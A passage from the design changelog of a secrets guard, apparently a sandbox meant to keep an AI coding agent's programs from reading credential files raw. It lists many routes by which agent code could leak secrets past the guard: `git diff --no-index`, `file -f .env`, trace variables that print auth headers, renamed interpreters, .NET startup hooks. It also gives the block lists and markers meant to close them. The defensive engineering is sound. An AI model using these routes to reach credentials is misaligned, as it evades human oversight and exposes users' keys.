    byte-identical to an installed one (a `pyenv` or self-built python, an
    `nvm` node, a static busybox) passed under a new name: no name and no
    host hash said what it was. The guard now reads the executable it
    hashes for an interpreter's own front end (`reader_identity.rs`
    `RUNTIME_MARKERS`, `runtime_of`): the entry its `main` hands the command
    line to, or a text only that front end prints. CPython's `Py_BytesMain`
    / `Py_Main` (a shared build's small binary imports it, a static build
    carries it), node's `node::Start(int, char**)` and Electron's run-as-node
    switch, perl's `perl_parse`, ruby's `ruby_run_node`, lua's usage line,
    Tcl's `Tcl_Main` and Tk's `Tk_MainEx`, Java's launcher `JLI_Launch`
    (java, and keytool and its kin, which take `-J` options), PHP's
    `php_execute_script`, BusyBox's banner, bash's version line, zsh's
    `zsh_main`, the ash family's (dash) `set -o` header (which ksh93, mksh
    and posh print too). The families this first table left out followed
    on 2026-10-04 (below). For a binary whose
    name the code-running list does not already mark, a match is reported
    among the opener's findings as `runs:<family>`, and the arbiter treats
    it as an `args:` finding (`argsCodeProblem`, `runtimeOf`): no reader in
    any form, never prompted for, no prior verdict, a protected write asked
    per run; in the guard, such a binary is no socket reader. The content is
    read with the hash, once per inode (a 234 MB binary in about 0.37 s with
    the thirty-six markers of 2026-10-04, searched a 256 KiB window at a
    time, each window by every marker while it is in the cache: one pass
    per marker took 0.8 s), for the process the guard decides about (an opener, a writer,
    a socket client), not for its ancestors: a `from:` parent is judged as
    before (out of reach, clean environment), since reading every ancestor
    whole (the agent's own binary among them) held each first open by a
    second; an executable the guard cannot read is not judged clean. The hash
    and the search (memchr's SIMD substring search) are built optimized in
    every profile: unoptimized, each took over a second per 40 MB, and a test
    build's guard held a first open past its callers' timeouts. The table is stored masked (each byte XOR a constant),
    so the guard and its tests, which carry it, are no interpreter
    themselves: plain literals were pooled into one marker. Chosen over
    library names (a static build names no libpython; a shared build's
    soname would have to be followed into the library) and over the
    symbols an EMBEDDING program shares (`Py_Initialize` is in vim and gdb,
    `lua_pcall` in nmap); on a Debian desktop each marker is in its
    interpreter and nowhere else in /usr/bin but `tailscaled` (BusyBox's
    banner). A `#!` script needs no rule:
    the kernel runs its interpreter, which is the opener the guard sees
    (judged by name, hash or content); a pin of the script's own path
    matches no opener.

    *The families left out, 2026-10-04.* Each marker below was checked
    against the Ubuntu 26.04 build and, where one was at hand, an older or
    upstream one (the binaries fetched, not installed); each is the
    front end's own text or the entry its `main` hands the command line
    to, never what a library or an embedding program shares:

    | Family | Marker | Checked against |
    |---|---|---|
    | `ksh` | the `.sh.subshell` variable | ksh93u+m 1.0.10, ksh2020 |
    | `mksh` | `@(#)MIRBSD KSH`, lksh's `@(#)LEGACY KSH` | mksh R59 and R58, glibc, musl, klibc and dietlibc builds |
    | `posh`, `yash` | `posh_builtin_getopts`; `Yet another shell, version` | posh 0.14.3, yash 2.55 |
    | `tcsh` | its version line `tcsh %d.%.2d.%.2d` | 6.24.13, 6.21.00 |
    | `csh` | BSD csh's `Use "exit" to leave csh.` | csh 20240808 |
    | `fish` | its exec error `fish scripts require an interpreter directive` | fish 4.2.1 (Rust), 3.7.0 (C++, whose other texts are wide strings) |
    | `toybox` | its usage line `usage: toybox [--long` | 0.8.9 |
    | `luajit` | its front end's `Perform LuaJIT control command` (not the library's banner, which OpenResty and neovim carry) | 2.1 (2025), 2.1.0-beta3 |
    | `guile` | the `scm_shell` import (NUL-terminated) and `guile: warning: failed to install locale` | 2.2.7, 3.0.11 |
    | `racket` | Racket CS's `racket_boot`, whose argv is racket's command line | 8.18 |
    | `R` | `R_running_as_main_program` (`exec/R`, the binary the `R` script runs), littler's `/etc/littler.r` | R 4.5.2, littler 0.3.22 |
    | `julia` | the launcher's import `jl_load_repl` (the small `julia` binary; libjulia is not read) | 1.11.1 |
    | `bun` | `Bun is auto-restarting due to crash`, and `BUN_BE_BUN` (the switch that makes a compiled program bun) | 1.0.0, a September 2026 release |
    | `deno` | its CLI's `A modern JavaScript and TypeScript runtime` (not in `denort`, what `deno compile` programs run) | 1.30.0, 1.46.3, 2.x |
    | `pwsh` | `pwsh.dll`, the assembly PowerShell's .NET apphost (the file exec'd) names | 7.4.6 |

    Where a family has its own marker the shared `set -o` header moved to
    the end of the table, so a ksh is named `ksh`. Not marked: `Rscript`
    (it only execs `R`, which is the opener) and `fish_key_reader`. A
    sweep of 19,821 ELF files on the development host (/usr/bin, /usr/sbin,
    /usr/lib, /usr/libexec, /usr/local, /opt, /snap and the user's tool
    directories) found the new markers in nothing but the four installed
    versions of Claude Code's native binary, a `bun build --compile`
    program and so bun itself (see the cost below); the fetched binaries
    matched their own family and no other, `denort` and `Rscript` none.
    The guard's own test binary carries none (the table is masked).

    Not covered, stated: an interpreter none of these
    marks (Racket BC, julia before 1.6, OpenBSD's ksh (`oksh`), elvish,
    nushell, a .NET `dotnet` muxer, …) under a name the list does not know and not
    byte-identical to an installed one; a launcher (`env`, `xargs`) or a
    printer in that case, which has no front end of its own to mark; a
    disguised interpreter as a `from:` parent (its content is not read; it
    must be out of the agent's reach, a root install) (each of these three
    closed by (13), 2026-10-07: the families by their own markers, a GNU
    printer or launcher by its package's text, an out-of-reach parent read
    too); the dashboard and `mandu why` do not know a pin's content (the finding is
    made at the open: they mark such a pin only once its hash is an
    installed program's). Cost: such a build named as a reader reads
    nothing raw (pin a script with an installed interpreter); a program
    that embeds a front end (an Electron app, `keytool`, `tailscaled`) is
    no reader, and since 2026-10-04 neither is a `bun build --compile`
    program (it carries the whole runtime, which a recent build becomes
    under `BUN_BE_BUN=1`), a deno 1.x `deno
    compile` program from before `denort` (the whole deno CLI), a `raco
    exe` program or `fish_indent` (littler's `r`, on
    no name list, is now known for the interpreter it is). Claude Code's native
    binary is such a bun program: as the opener it was no reader anyway,
    and a protected file it writes itself (the Write tool on `~/.bashrc`)
    is now asked per run, as for a shell's inline code, an answer no longer
    reused for that build.
  - *The ssh-agent socket's readers by hash.* The guard judged them by name
    only, so a byte-identical copy of a code-running program or a printer
    under a leaf program's name, out of the agent's reach, connected:
    Debian's `/usr/bin/perl5.40.1` (a hard link of `perl`, its suffix no
    alternatives suffix) listed there reached the agent and ran the agent's
    code with the human's keys. After the name and trust checks
    (`socket_reader_match`, whose trust now includes the content finding),
    the guard asks the arbiter what the binary is (`readerProgram`: by name,
    path and the host's program hashes, the same `binaryPrints` /
    `binaryRunsCode` every file reader list is judged by) and admits only a
    binary it found neither (`socket_identity_admits`); no answer, or no
    hash, refuses. Chosen over a guard-side scan of the host (a second copy
    of `program-hashes.ts` to keep equal). Cost: the ssh-agent is refused to
    the agent's programs while the arbiter is down (fail-closed, as every
    interceptor); one more round trip per connect.
  - *The dashboard asks the arbiter.* Its mirror of the lists judged names
    only: a pinned renamed copy showed as a reader, and the secrets panel,
    which received pins as their `app:` names, marked an `{ app: python3,
    script: … }` pin "(admits nothing)". The arbiter now says per entry
    what it decides: `whyPath`'s `readersAdmitNothing`, `readersPrint`,
    `readersCopyOf` (the file page reads them, naming "a copy of
    python3.12") and `confidentialityState`'s `readersAdmitNothing` (the
    secrets panel). The mirror is the fallback for an older arbiter and for
    the rule list, whose snapshot carries no readers.
- *(9) Programs that print a file when asked, though printing is not their
  job (2026-10-04).* The list's own rule (a program that can print a file
  when asked is listed) was applied to programs whose job is printing;
  many others print a named file through an option. `file -f <file>`
  prints every line as `<line>: cannot open`, so `file` named in a
  `.env`'s `readers:` read it raw, and `file -f .env | python3 …` handed
  the agent's code every line, the §4.9 gap the printer rule closes
  (`printer-downstream.test.ts`, red before). What was already true: a
  non-printer not on the list gets the twin (no list, or `others: twin`)
  or the refusal, so only a human's entry, or an *Allow* under `ask:
  always`, gave such a program the raw bytes; and the model never saw
  them, since the raw read taints the call and the proxy masks its result
  (the fold, §2.2): the gap was the agent's code downstream. Probed on
  Ubuntu 26.04 with a dummy file, these join the list in its three copies:
  what reads names, dates or hosts from a file and echoes each one it
  cannot use (`file -f`, `date -f`, `wc` and `du --files0-from=`, `logger
  -s -f`, `ssh-keyscan -f`); the typesetters and manual-page tools, whose
  output is the text (`groff`, `nroff`, `troff` and the preprocessors
  `preconv`, `soelim`, `tbl`, `eqn`, `pic`, `refer`, `grn`; `grotty`,
  `mandoc`, `man -l`, `whatis` / `apropos -C`, `lexgrog`, `ul`, `colcrt`,
  `tic`, which echoes the entries it rejects, `scriptreplay`); the
  compilers, assemblers and linkers (`cpp` and `cc -E` print the file, an
  `@<file>` response file comes back word by word in their errors, and so
  in binutils', `objcopy -I binary` copies it, `objdump -s -b binary` dumps
  it: `cpp`, `cc`, `gcc`, `g++`, `c++`, `cc1`, `cc1plus`, `collect2`,
  `clang`, `clang++`, `clang-cpp`, `rustc`, `as`, `ld`, `gold`, `nm`,
  `ranlib`, `c++filt`, `objcopy`, `objdump`, `readelf`, `size`, `strip`,
  `elfedit`, `gprof`, `addr2line`, `bison`, `yacc`, `byacc`, `rpcgen`); and
  gettext's catalog tools (`msgcat` and its kin, `xgettext`). A versioned
  name (`gcc-15`, `x86_64-linux-gnu-ld.bfd`) is the same program by its
  host hash ((2): the scan follows `gcc` to the file it names). Not added,
  stated: the checksum tools (`sha256sum -c` prints only the name field of
  a well-formed checksum line), `ssh-keygen` (no mode printed a dummy
  file's line), and programs that run code, which admit nothing already.
  Like the rest of the list this is a name list: a program not on it that
  prints a file when asked is a gap to close by adding it (`git`, the
  known one, joined it as (11)). The structural alternative, admitting raw only
  programs vetted not to print (an allow-list of leaf readers), would
  turn every human-named leaf into a refusal and is left to a maintainer
  decision. Utility cost: `readers: [wc]` or `[file]` give no raw bytes;
  `wc` and `sha256sum` already admitted nothing where coreutils is uutils.
  Tests: `printer-readers.test.ts` (the names; each such program, where
  installed, prints a dummy file it is pointed at), `secret_open.rs`, the
  parity in `tests/stack/reader-identity.test.ts`, and under the real guard
  `printer-downstream.test.ts` (`file -f` of a file listing `file`: its
  twin, no byte downstream, red before; of a file with no list: its twin;
  nothing on the model's wire); `reader-output-rule.test.ts` names GNU
  `sha256sum` as its leaf reader in place of `wc`.
- *(10) Build tools, more runtimes, and versioned names (2026-10-04).* The
  code-running list named the shells, the interpreters and `make`, not the
  other programs that run the code of a build file or an argument. Probed on
  Ubuntu 26.04: `cmake -P <script>` and `cmake -E env <cmd>`, `ctest -S`,
  `ninja -f`, `go run`, `cargo build` (the package's `build.rs`),
  `run-parts <dir>` and `tex -shell-escape` each ran a command they were
  handed. So `cmake` named in a `.env`'s `readers:` read it raw and ran
  the agent's script with the bytes (`file(READ …)`, then any metadata
  exit, §4.9; `build-tool-reader.test.ts`, red before), and `php8.5`,
  `lua5.4`, `tclsh8.6`, `ruby3.3`, `perl5.40.1` (the files the
  distribution's `php`, `lua`, `tclsh` links name) were code runners only
  by their host hash: a version suffix that does not start with a dot is
  no alternatives suffix (`appNameMatches`), so a pin of such a binary
  with another hash (another build, a version manager's copy) read raw.
  Joined to the list in its three copies: the build tools and task
  runners (`cmake`, `ctest`, `cpack`, `ninja`, `samu`, `go`, `cargo`,
  `rustup`, `bazel`, `bazelisk`, `buck`, `buck2`, `please`, `just`, `task`,
  `mage`, `xmake`, `premake`, `qmake`, `qtchooser`, `bmake`, `pmake`,
  `remake`, `gn`, `scons`, `meson`, `muon`, `gradle`, `mvn`, `ant`, `sbt`,
  `rake`, `npm`, `corepack`, `pnpx`, the `nix` tools, `guix`, `dotnet`,
  `terraform`, `tofu`, `packer`, `podman`, `buildah`, `run-parts`, `at`,
  `batch`); more runtimes and REPLs (`nodejs`, `pypy`, `irb`, `erb`,
  `jruby`, `php-cgi`, `raku`, the BEAM (`erl`, `beam.smp`, `escript`,
  `elixir`, `mix`), OCaml, Prolog, the Lisps and Schemes, the JVM
  languages, `mono`, `runghc`, `nim`, `zig`, `dart`, `swift`, `tcc`,
  `qjs`, `gjs`, `gforth`, `wasmtime`, `dc`, `bc`, `octave`, `gnuplot`,
  `maxima`); more shells (`rbash`, `yash`, `posh`, `elvish`, `nushell`,
  `xonsh`, `osh`, `ysh`); and the TeX engines (`\write18`, `\directlua`).
  Most build tools that are scripts (`meson`, `scons`, `gradle`, `npm`)
  already ran as their interpreter; their names are listed so an entry
  naming one admits nothing too. And both lists now also match a name
  without a trailing version after a letter (`withoutVersion`, `php8.5` →
  `php`, `gcc-15` → `gcc`; in the guard `without_version`): no listed
  program loses a match, and a leaf reader keeps its exact name. Two
  consumer-table programs join: `npm` (its opener was `node` already) and
  `cargo`, which runs the package's `build.rs` while it holds
  `~/.cargo/credentials`; like `node` for `.npmrc` (decision (b)) it now
  reads that file only as the twin, the wire release's or, without it,
  the default's. Cost: `cargo publish` without the wire release
  (`MANDU_WIRE_TWIN=0`, or TLS inspection off) fails its login; `readers:
  [cmake]` and the like give no raw bytes. Not covered, stated: a code
  runner no name or host hash knows (a static download under a name of
  its own), and the credential plugins of `docker`, `kubectl`, `helm`,
  `aws`, `gh` (above). Tests: `code-runner-copies.test.ts` ((4): the
  names, `cargo`'s twin, versioned names and `withoutVersion`; each build
  tool, where installed, runs a command it is handed),
  `reader-launchers.test.ts`, `secret_open.rs`,
  `tests/stack/reader-identity.test.ts` (the parity; over the production
  wiring `cmake`, `go`, `ninja` and `php8.5` with a hash no installed
  program has refused unasked, red before, `cargo` served the twin), and
  under the real guard `build-tool-reader.test.ts` (self-skips without
  cmake; the CI kernel guest installs it since this change).
- *(11) `git` is a printer (2026-10-04, §4.9 option (a), the maintainer's
  decision).* `git` was the vetted consumer of `.git-credentials` and
  `.netrc` (and, on the consumer table's row, of the ssh keys) and no
  printer, yet `git diff --no-index /dev/null <file>`, `git grep
  --no-index -h . <file>`, `git config -f <file> --list` and `git
  hash-object -w <file>` then `git show` print any named file: listed, or
  as a default reader without the wire release, it handed the raw bytes to
  whatever read its output (the residual of §4.9). It joins
  `PRINTER_READERS` in the three copies (arbiter, dashboard, guard; pinned
  equal by `tests/stack/reader-identity.test.ts`), with the programs that
  are git or open git's credential files:
  - `git-credential-store`, the store helper and the consumer table's
    second name for the file, is git itself: the one binary picks its
    builtin from `argv[0]`, and git's exec path holds every builtin as a
    link of it (symbolic on Ubuntu 26.04, so `/proc/<pid>/exe` names `git`;
    hard where a package keeps git's own `make install` default, so it
    names `git-credential-store`).
    Named, so a hard-linked install is judged by its name too. Every other
    builtin (`git-diff`, `git-grep`, `git-config`, `git-cat-file`, …) is
    git by its hash ((2)): `program-hashes.ts` now also scans git's exec
    path (`/usr/lib/git-core`, `/usr/libexec/git-core`), so a host whose
    exec-path `git` is not byte-identical to `/usr/bin/git` is covered;
  - `git-remote-http` (and its links `-https`, `-ftp`, `-ftps`), git's
    HTTP transport, a separate binary: it is the program that opens
    `.netrc` for git (libcurl's netrc option), and it prints the header it
    sends, the `.netrc` credential included, under `GIT_TRACE_CURL` with
    `GIT_TRACE_REDACT=0`. It was not on the consumer table (whose `.netrc`
    row named only `git`, which never opens the file), so it was no
    default reader before either; it joins the row now, so like `curl` it
    gets `.netrc`'s twin under the wire release also when the file has a
    reader list (it was refused there before), and listed it admits
    nothing;
  - *(2026-10-07)* the programs git builds on their own, beside
    `git-remote-http`. The list above first said every other name in git's
    exec path was a link of git; Ubuntu's `git` package (2.53) ships
    `git-http-fetch`, `git-http-push`, `git-imap-send`,
    `git-http-backend`, `git-daemon`, `git-shell`,
    `git-sh-i18n--envsubst` and `scalar` as separate ELF files, and the
    hash scan, which hashes only a file whose name is a printer, skipped
    them, so a `{ app: git-http-fetch, prints: nothing }` (the words
    Mandu's own hint suggests) read `.netrc` raw. Now named in the three
    copies (the scan then hashes the installed binaries):
    `git-http-fetch` (git's dumb-HTTP fetch), `git-http-push` (its WebDAV
    push) and `git-imap-send` link git's `http.c`, so libcurl opens
    `.netrc` for them and `GIT_TRACE_CURL=1 GIT_TRACE_REDACT=0` prints the
    `Authorization` header (the IMAP login) they send; `git-http-backend`,
    the CGI server, sends a file its request names (a repository's
    `objects/info/alternates`, a symlink to any file, comes back whole,
    probed on 2.53). `git-http-fetch` and `git-http-push` are the programs
    `git-remote-http` starts for a dumb-HTTP remote, so they join the
    `.netrc` consumer row and get its twin under the wire release;
    `git-imap-send` speaks IMAP, which the wire release does not serve, so
    it is not on the row and, listed, is refused. Not named: `git-daemon`
    and `scalar` (they run git for every file they serve or touch),
    `git-shell` (it runs the git commands it allows, or a program from
    `~/git-shell-commands`, which is judged by its own name),
    `git-sh-i18n--envsubst` (reads its standard input only, so the shell
    of a redirect is the opener), and the shell and Perl scripts
    (`git-submodule`, `git-send-email`, …: the interpreter is the opener).
    Proved by `arbiter/test/unit/printer-git-transports.test.ts` (red on
    the code before; the same checks over `git-remote-http` the control)
    and `tests/stack/reader-identity.test.ts` (the three copies);
  - `git-credential-cache` (a builtin) and its daemon are git by hash; the
    cache holds credentials in memory, no file. *(2026-10-07, the
    maintainer's decision)* every other credential helper is a printer by
    its name: `PRINTER_NAME_PREFIXES` (`git-credential-`, in the three
    copies, pinned equal by `tests/stack/reader-identity.test.ts`) makes
    any program named `git-credential-<something>` one, since a helper
    prints `password=<secret>` on `get` (its protocol, gitcredentials(7)):
    `git-credential-libsecret`, `-osxkeychain`, the Credential Manager (a
    .NET program), a third party's. A script so named is one too
    (`scriptPrints`): a `{ app: perl, script: …/git-credential-netrc }` pin
    admits nothing, perl running that script is no reader (the twin, or the
    refusal), an answer about the pair applies to nothing, and the hash
    scan hashes a helper installed under the prefix. Before, such a helper
    named with `prints: nothing` read a labelled file raw and printed it.
    Proved by `arbiter/test/unit/printer-git-credential-prefix.test.ts`
    (red before, `git-credential-store` and a script of another name the
    controls), `dashboard/test/unit/view-model/reader-runs-code.test.ts`
    and the parity test.
  As with `curl` and `scp`, the printer rule wins over a consumer row
  except that a consumer-table printer still gets the twin the wire release
  serves (Plan 10 §11.13.1): under TLS inspection (the `secrets` default)
  `git` and `git-credential-store` read `.git-credentials`' twin and the
  session proxy puts the password back at its host, as before (the
  twin was already what they got there, listed or not). The ssh keys: `git`
  never opens them, `ssh` (which git starts) does, and `{ app: ssh, from:
  git }` still admits that ssh (the `from:` names an ancestor, which the
  printer rule does not judge). git also runs commands it is given (`-c
  alias.x='!…'`, `core.pager`, `credential.helper='!…'`, hooks); it is not
  added to the code-running list, since as a printer it admits nothing
  already and `args_code.rs` keeps its options for the `from:` parent and
  protected writes. `policyWarnings` names a listed `git` (or its
  helper) as a printer, how it prints, and what still works; the dashboard's
  warning says the same, and `whyPath` gains `consumersPrint` so `mandu
  why` and the dashboard no longer call a printing consumer (`curl`,
  `scp`, `git`) one that reads the file by default; a pending Inbox
  question about git and an old *Always* for it are retired or count for
  nothing, as for every printer ((4)). Utility cost: without the wire
  release (`MANDU_WIRE_TWIN=0`, or TLS inspection off) `git
  credential-store` gets the twin and an HTTPS login with a stored
  password fails, as `curl --netrc` already did; `readers: [git]` gives no
  raw byte (name the program that uses the secret). Tests:
  `printer-readers.test.ts` (git and its helpers listed admit nothing
  under every `ask` mode; the wire twin listed or not; no raw without it,
  red before; `ssh` under git still reads the key; a hard or symbolic link
  of git in an exec-path fixture is a printer by hash; the installed
  builtins hash as git; the warnings; over a real server no prompt, no
  pin, no taint, and `consumersPrint`), `args-code-reader.test.ts` (unit
  and component: the code-by-argument cases moved to `psql` and `ssh`,
  git refused as a printer), `flow-taint.test.ts`,
  `printer-leftovers.test.ts`, `secret_open.rs`
  (`git_is_a_printer_and_its_ssh_still_connects`), the dashboard's
  `file-browser.test.ts`, the launcher's `why.test.ts`, and under the real
  guard `printer-downstream.test.ts` (`git diff --no-index /dev/null .env`
  and `git grep --no-index` with git listed print the twin's lines, nothing
  downstream gets a byte, red before), `args-code-reader.test.ts` (a plain
  `git hash-object` of a file listing git reads no byte, red before; git's
  store helper parses the twin) and `twin-format-fidelity.test.ts` (the
  store helper hands git the password's placeholder).
- *(12) An allow-list of readers, and `prints: nothing` (2026-10-04, the
  maintainer's decision).* Items (1) to (11) each found more programs
  that print a file, or run code, when asked, and each was a gap until it
  was listed: the name lists are a block-list, and a block-list is never
  done. The rule is inverted. **Raw bytes go only to a vetted reader, or to
  a program the human vouches for; every other program gets the twin.**
  - *The vetted readers* (`VETTED_READERS`, in the three copies: the
    arbiter, the dashboard, the guard; pinned equal by the parity test) are
    the programs probed not to print a file they are pointed at: `ssh` and
    `ssh-add`, probed on Ubuntu 26.04 (`ssh -F <file>` prints a line's
    first word, and `-F` is code by argument already; `ssh -i`, `ssh-add
    <file>` print nothing of it). *The Postgres tools (correction of
    2026-10-04).* `psql`, `pg_dump` and `pg_restore` were first listed on
    the maintainer's word, unprobed; the maintainer's rule is "vetted = only
    programs probed not to print", so they came off, and the probe they
    waited for was then run (the distribution's packages unpacked, a
    throwaway server on 127.0.0.1, a dummy file): `psql -a -f <file>` and
    `psql -f <file>` echo its lines (the `-f` form is code by argument
    already), `\i <file>` and `\copy t from <file>` given on psql's
    standard input print it too, and psql runs a shell command it is handed
    there (`\!`, a backquoted `\set`); `pg_restore -f - <dump>` (no `-d`)
    writes a dump file out as SQL. By the printer list's own rule (a program
    that can print a file when asked is listed) `psql` and `pg_restore` are
    printers, in the three copies: they admit nothing, `prints: nothing`
    cannot lift them, and they read `.pgpass` as its twin, which does not
    log in (the Postgres protocol is not HTTP: no wire release), so a
    Postgres login with a password file fails under Mandu (`PGPASSWORD` in
    the launch environment is not a file and is not affected by this; since
    2026-10-09 the environment mask takes it, plan 10 §11.4, so a password
    login fails either way unless the law exempts the variable). `pg_dump`
    printed no file (`--filter <file>` refuses a line it cannot parse
    without echoing it, but a well-formed pattern that matches nothing is
    echoed: "no matching tables were found for pattern …", a print
    confined to that file format, as `sha256sum -c` is): it is not a
    printer and not vetted, so it reads the twin unless its entry carries
    `prints: nothing`. Not vetted, stated:
    `git` and `git-credential-store` (printers since (11); the helper was
    probed here too: `get` prints the credential it stores, its job); the
    cloud CLIs (`aws`, `gh`, `docker`, `kubectl`,
    `helm`) stay off until someone probes them on a host that has them;
    `curl`, `scp` (printers), `npm`, `yarn`, `pnpm`, `node`, `cargo`,
    `twine` (code). A signed pack's programs are not vetted either: a pack
    is not a probe. An unvetted program relies on the wire release's twin
    in `secrets` (Plan 10 §11.13.1), or on the human's word.
  - *The human's word, `prints: nothing`.* A reader entry carrying it, in
    any form (`{ app: deploy, prints: nothing }`, pinned by path and hash,
    an `(interpreter, script)` pin, with `from:`), says the human knows the
    program keeps the file's contents out of what it prints, writes and
    sends. It is independent of `output:` (D3): raw bytes and what the
    model sees of the output stay two choices, so `{ app: deploy, prints:
    nothing }` reads raw and its output still reaches the model masked.
    The vouch is the field: a pin the human writes by hand carries it, and
    an *Always allow* answered on the warning question below writes it; a
    pin Mandu writes on its own (the first use of a bare name, an *Always*
    given on the old question) never adds it, and since Mandu cannot tell
    a pin it wrote from one the human wrote in a law that predates the
    field, a pin without it is no vouch. A bare name's first-use pin keeps
    the field the human wrote on the name.
  - *Refusals first.* A printer or a program that runs code (by name,
    path or hash, D8's lists, which stay as defense in depth) admits
    nothing whatever the entry says: `{ app: cat, prints: nothing }` is
    refused, and the validator says why ("cat prints the files it reads;
    `prints: nothing` cannot change that"). An `(interpreter, script)` pin
    with the field is honored (the pair is the human's program, R5).
  - *The rule in `decideOpen`.* After the refusals, the wire release, the
    loader environment and code by argument (unchanged): a program the
    entry matches reads raw only when it is vetted or the entry vouches for
    it; else it gets the twin, whatever `others:` says (the human named it:
    the placeholders keep it working), and under `ask: always` it is held
    in the Inbox with the warning. With no `readers:` list a consumer-table
    program reads its own file raw only when vetted (`ssh` and `ssh-add`
    for the keys); the others get the twin, the wire
    release's where it serves (`gh`, `.npmrc`, `.netrc`, `.git-credentials`,
    `.pypirc`, `.cargo/credentials`), and under `ask: known` the unvetted
    one is asked about with the warning. A program not on the list is
    asked about under `ask: always` (with the warning when it is unvetted)
    and gets the twin or the refusal otherwise, as before.
  - *The warning question.* An unvetted program is asked about under its
    own verdict kind, `trust:<exe>#<sha256>[#script:…]`, so an answer given
    to the old question (`open:`), which never said the program might print
    the file, does not count for it (the printer precedent): a pending one
    is retired, an answered one is shown as no longer applying, and the
    program is asked again. The card says, in the product's words: "Mandu
    does not know whether <program> keeps what it reads out of what it
    prints. If you allow it, the AI's other programs may be able to read
    the file through it." *Allow once* lets this open read raw; *Always
    allow* writes `{ app, path, sha256, prints: nothing }` (with the script
    pin for an interpreter) into the law.
  - *The ssh-agent socket* follows: a connecting program must be vetted
    (`ssh`, `ssh-add`) or vouched for by its entry, after the printer and
    code-runner refusals (the guard's `socket_reader_match`).
  - *Migration.* A law loads unchanged. Every entry naming an unvetted
    program without `prints: nothing` now gives that program the twin
    (fail-closed, the maintainer's rule: utility may be lost). The validator
    warns per entry and names the fix ("deploy is not a program Mandu knows
    keeps a file's contents out of what it prints, so it reads the
    placeholder copy. If you are sure it does, write `{ app: deploy, prints:
    nothing }`."); `mandu why <file>` and the dashboard (" (reads the
    placeholder copy)" beside the entry) say the same. Old Inbox answers for
    such programs are asked again, with the warning.
  - *Where Mandu writes the field, and where it cannot tell.* The
    maintainer's rule is that a pin the human writes by hand vouches and a
    pin Mandu writes does not. A law that predates the field cannot say
    which pins Mandu wrote (first uses, old *Always* answers), so the vouch
    is the field itself: a hand-written pin, an `(interpreter, script)` pin
    included, vouches when it carries `prints: nothing`, and the validator
    names every pin that does not. Fail-closed: a hand-written pin from
    before the change reads the twin until the human adds the field.
  - *The drills.* The hold drills' own program (`mdu-digest`, the
    `conf-hold-*` drills) is no vetted reader, so its Inbox row is now the
    warning question (`trust:<path>#<sha256>`); the runner answers `trust:`
    rows as it answers `open:` rows (`planHoldAnswers`).
  - *What it costs.* (`git`'s cost is (11)'s.) `aws` (SigV4 signs with the secret), `docker`
    (the daemon logs in) and `kubectl` / `helm` (they pin the cluster CA)
    read their credentials as the twin, which does not log in: a human who
    trusts them writes `prints: nothing` (or the probe vets them). The
    guard suites' raw holder (`mdu-holder`) carries the field.
  Tests: `reader-allow-list.test.ts` (the rule, the vouch, the refusals,
  the migration warnings, pins keeping the field), `secret_open.rs` (the
  socket's readers), the parity of `VETTED_READERS` in
  `tests/stack/reader-identity.test.ts`, which also drives the warning
  question over the production wiring (an old `open:` answer not counted,
  *Always allow* writing the field), the dashboard's card and marks, and
  under the real guard `tests/sandbox/guard/reader-allow-list.test.ts`: an
  unvetted program named without the field reads the twin, with it reads
  raw, a vetted leaf (`ssh-add`) still reads raw, and nothing reaches the
  model's wire in any case.
- *(13) Programs known by name only (2026-10-07, P0 item 14 of the work
  ledger).* After (12) a program reads raw only when vetted or vouched for,
  but the refusals that come first (a printer, a program that runs code)
  still judged a binary that is no byte-identical copy of an installed one
  by its name, and the human's `prints: nothing` on a pin vouched for
  whatever the pinned file turned out to be. Five gaps, each moved from the
  name toward the binary's identity, fail-closed:
  - *Interpreters known by name only.* The guard's content table (8) gained
    the families !533 left by name: elvish (its shell package,
    `src.elv.sh/pkg/shell`, and the older module path), nushell (its REPL
    module `nu_cli::repl` and crate path), the .NET muxer (`dotnet`, which
    runs any assembly: its usage line `Usage: dotnet [path-to-application]`,
    which an app's own apphost does not carry), Racket BC (its command-line
    help, also in `gracket`), julia before 1.6 (its own economy-REPL
    warning; 1.6 on is (8)'s `jl_load_repl`) and the public-domain ksh
    line (`@(#)PD KSH v`: OpenBSD's ksh, `oksh`, `loksh`, `pdksh`, which
    the ash header named `sh` before; now named for itself). Checked
    against the real binaries, fetched not installed: elvish 0.14.1,
    0.18.0, 0.21.0 (upstream and Ubuntu 26.04's), nu 0.60.0, 0.80.0,
    0.116.1 (and its plugins, which carry no marker), the .NET 3.1.32 and
    8.0.11 muxers (the 8.0.11 apphost and single-file host carry none),
    Racket 7.9 BC's `racket` and `gracket` (8.18 CS stays `racket_boot`),
    julia 1.0.5, 1.5.4 (and 1.6.7 by its own marker), oksh built from its
    source. A sweep of the development host's 19,647 ELF files found none
    of the new markers. The names they install as joined the list in its
    three copies: `nu` (the list had only `nushell`), `oksh`, `loksh`,
    `pdksh`, `racketbc`, `racketcs`; a bare distribution prefix names no
    program (`gnu` is not `g` + `nu`).
  - *Printers and launchers that are no byte-identical copy.* A GNU `env`,
    `cat` or `xargs` of another version, a static download, renamed
    `mytool` and pinned with `prints: nothing`, read raw: no name, no host
    hash said what it was, and a printer or a launcher has no front end of
    its own to mark. What it does carry is its package's own text, which
    every program of the package prints (`--version`, the usage line). The
    guard's `PACKAGE_MARKERS` (`reader_identity.rs`, masked as the
    runtimes are): GNU coreutils' name, findutils', util-linux's version
    (`util-linux 2.`), diffutils', GNU sed's, and grep's and tar's usage
    lines (their package names are also in `dpkg`, `as` and Claude Code's
    binary). For a binary whose name neither list knows, a match is
    reported as `pkg:<package>` among the findings; the arbiter treats it
    as a printer (`contentPackageOf`, `openerPrints`): no reader in any
    form, never asked about, what a non-reader gets, the reason naming the
    package. coreutils' checksum tools (`sha256sum`, `md5sum`, `b2sum`,
    `sum`: the leaf readers the tests and examples name with `prints:
    nothing`) are excepted by their shared usage line, unless the binary
    is the multi-call one (`--coreutils-prog`), which is every coreutils
    program. A sweep of the host: each marker only in its package's
    programs (findutils' name also in PHP's `fileinfo.so`, a library, never
    an opener). An interpreter's marker wins over a package's (BusyBox
    carries GNU sed's name).
  - *A disguised interpreter as a `from:` parent.* An ancestor's content
    was not read (the agent's own binary is often one, a quarter of a
    gigabyte). It is now read for an ancestor out of the agent's reach
    (only such a one can be a trusted parent), once per inode
    (`ancestor_trusted`): a root-installed interpreter or printers' program
    under the parent's name is not that parent.
  - *.NET's loader variables.* A .NET program's apphost takes any name, and
    `DOTNET_STARTUP_HOOKS`, `DOTNET_ADDITIONAL_DEPS`, `DOTNET_SHARED_STORE`,
    `DOTNET_ROOT*` and the CoreCLR profiler variables load managed code
    into it, read as data and JIT-compiled, so the mapping check misses it:
